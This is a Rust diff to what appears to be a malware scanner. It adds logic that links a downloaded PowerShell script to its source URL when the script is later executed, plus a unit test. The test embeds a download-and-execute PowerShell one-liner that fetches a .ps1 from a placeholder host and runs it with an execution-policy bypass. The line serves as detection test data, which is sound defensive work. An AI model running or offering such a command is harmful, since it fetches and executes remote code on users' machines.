@@ -414,6 +414,83 @@ fn destination_basename_looks_like_file(value: &str) -> bool {
             .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
 }
 
+fn ps_statement_executes_download_destination(statement: &str, dst: &str) -> bool {
+    if !ps_destination_looks_like_script(dst) {
+        return false;
+    }
+    let lower_statement = statement.to_ascii_lowercase();
+    let lower_dst = dst.to_ascii_lowercase();
+    let mut search_start = 0;
+    while let Some(rel_pos) = lower_statement[search_start..].find(&lower_dst) {
+        let pos = search_start + rel_pos;
+        let segment_start = statement[..pos]
+            .rfind(['\r', '\n', ';', '{', '}', '&', '|'])
+            .map_or(0, |idx| idx + 1);
+        let segment = &statement[segment_start..pos];
+        if segment.contains('>') {
+            search_start = pos + lower_dst.len();
+            continue;
+        }
+        let lower_segment = segment.to_ascii_lowercase();
+        if contains_powershell_invocation(&lower_segment) {
+            return true;
+        }
+        search_start = pos + lower_dst.len();
+    }
+    false
+}
+
+fn ps_destination_looks_like_script(dst: &str) -> bool {
+    let dst = dst
+        .trim()
+        .trim_matches(['"', '\''])
+        .trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
+        .to_ascii_lowercase();
+    dst.ends_with(".ps1") || dst.ends_with(".psm1")
+}
+
+fn contains_powershell_invocation(lower_segment: &str) -> bool {
+    lower_segment
+        .split(|ch: char| !matches!(ch, 'a'..='z' | '0'..='9' | '_' | '-' | '.'))
+        .any(|token| matches!(token, "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"))
+}
+
+fn push_download_and_execution_url_argument(
+    env: &mut Environment,
+    cmd: String,
+    src: String,
+    dst: Option<String>,
+    statement: &str,
+) {
+    let execution_url = dst
+        .as_deref()
+        .filter(|dst| ps_statement_executes_download_destination(statement, dst))
+        .map(|_| src.clone());
+    env.traits.push(Trait::Download {
+        cmd: cmd.clone(),
+        src,
+        dst,
+    });
+    if let Some(url) = execution_url {
+        push_url_argument_once(env, &cmd, url);
+    }
+}
+
+fn push_url_argument_once(env: &mut Environment, cmd: &str, url: String) {
+    if !env.traits.iter().any(|t| {
+        matches!(
+            t,
+            Trait::UrlArgument { cmd: existing_cmd, url: existing_url }
+                if existing_cmd == cmd && existing_url == &url
+        )
+    }) {
+        env.traits.push(Trait::UrlArgument {
+            cmd: cmd.to_string(),
+            url,
+        });
+    }
+}
+
 #[allow(clippy::expect_used)]
 static CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
     // Must have at least two + separators (3+ [char] terms) to avoid matching plain [char]N
@@ -4647,6 +4724,27 @@ mod herestring_iex_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn ps1_downloaded_script_execution_emits_url_argument() {
+        let payload = br#"iwr 'https://script-exec.example/dl.ps1' -out $env:TEMP\dl.ps1 -useb; if (Test-Path $env:TEMP\dl.ps1) { powershell -ep bypass -f $env:TEMP\dl.ps1 }"#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { url, .. }
+                        if url == "https://script-exec.example/dl.ps1"
+                )
+            }),
+            "downloaded script execution was not linked to source URL: {:?}",
+            env.traits
+        );
+    }
 }
 
 /// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
@@ -4852,11 +4950,13 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                 if !seen.insert((idx, url.clone())) {
                     continue;
                 }
-                env.traits.push(Trait::Download {
-                    cmd: format!("(ps1 #{idx}) {snippet}"),
-                    src: url,
+                push_download_and_execution_url_argument(
+                    env,
+                    format!("(ps1 #{idx}) {snippet}"),
+                    url,
                     dst,
-                });
+                    text,
+                );
             }
             downloadfile_elapsed += stage_start.elapsed();
 
@@ -4893,11 +4993,13 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                         .map(|m| logical_statement_at(text, m.start()))
                         .unwrap_or(primary);
                     let dst_hint = outfile_hint_from(statement);
-                    env.traits.push(Trait::Download {
-                        cmd: format!("(ps1 #{idx}) {snippet}"),
-                        src: url,
-                        dst: dst_hint,
-                    });
+                    push_download_and_execution_url_argument(
+                        env,
+                        format!("(ps1 #{idx}) {snippet}"),
+                        url,
+                        dst_hint,
+                        text,
+                    );
                 }
             }
             regex_elapsed += stage_start.elapsed();
@@ -4907,11 +5009,13 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                 if !seen.insert((idx, url.clone())) {
                     continue;
                 }
-                env.traits.push(Trait::Download {
-                    cmd: format!("(ps1 #{idx}) {snippet}"),
-                    src: url,
-                    dst: outfile_hint_from(primary),
-                });
+                push_download_and_execution_url_argument(
+                    env,
+                    format!("(ps1 #{idx}) {snippet}"),
+                    url,
+                    outfile_hint_from(primary),
+                    primary,
+                );
             }
             dynamic_elapsed += stage_start.elapsed();
 
@@ -4920,11 +5024,13 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                 if !seen.insert((idx, url.clone())) {
                     continue;
                 }
-                env.traits.push(Trait::Download {
-                    cmd: format!("(ps1 #{idx}) {snippet}"),
-                    src: url,
-                    dst: outfile_hint_from(primary),
-                });
+                push_download_and_execution_url_argument(
+                    env,
+                    format!("(ps1 #{idx}) {snippet}"),
+                    url,
+                    outfile_hint_from(primary),
+                    primary,
+                );
             }
             literal_elapsed += stage_start.elapsed();
         }
